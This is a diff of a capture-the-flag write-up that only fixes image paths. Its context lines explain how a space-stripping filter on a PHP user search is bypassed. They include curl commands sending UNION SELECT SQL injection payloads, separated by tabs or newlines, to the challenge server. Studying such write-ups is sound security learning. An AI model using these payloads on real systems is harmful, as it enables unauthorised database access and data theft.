@@ -14,7 +14,7 @@
 
 
 This is the screenshot of the website. We are given a search bar to search for users.
-![xctf_2018_baby_web_website_screenshot.png](../img/xctf_2018_baby_web_website_screenshot.png)
+![xctf_2018_baby_web_website_screenshot.png](xctf_2018_baby_web_website_screenshot.png)
 
 The source of the php file is in `src/baby_web.php`. The vulnerability lies inside that file.
 
@@ -45,7 +45,7 @@ die("die hacker!");
 
 `str_replace(" ","", $username)` deletes spaces from the variable `$username`. So when we give an input `"ad min"`, the SQL select statement selects usernames that matches `"admin"`.
 
-![xctf_2018_baby_web_demo.png](../img/xctf_2018_baby_web_demo.png)
+![xctf_2018_baby_web_demo.png](xctf_2018_baby_web_demo.png)
 
 
 
@@ -61,7 +61,7 @@ curl --data-binary "username=%'\nUNION\nSELECT\nflag\nFROM\nusers;#--" -X POST h
 curl --data-binary "username=%'\tUNION\tSELECT\tflag\tFROM\tUSERS;#--" -X POST http://ctf.pwn.sg:8180/?search
 ```
 
-![xctf_2018_baby_web_error.png](../img/xctf_2018_baby_web_error.png)
+![xctf_2018_baby_web_error.png](xctf_2018_baby_web_error.png)
 
 
 This is where we got stuck. We did not manage to solve the challenge. Turns out, we were on the right track. We just had to make a minor change to win.
@@ -76,7 +76,7 @@ username=%'	UNION	SELECT	flag	FROM	users;#--
 $ curl -d "@query_string" -X POST http://ctf.pwn.sg:8180/?search > output.html
 ```
 
-![xctf_2018_baby_web_winner.png](../img/xctf_2018_baby_web_winner.png)
+![xctf_2018_baby_web_winner.png](xctf_2018_baby_web_winner.png)
 
 We were *that* close to winning.
 
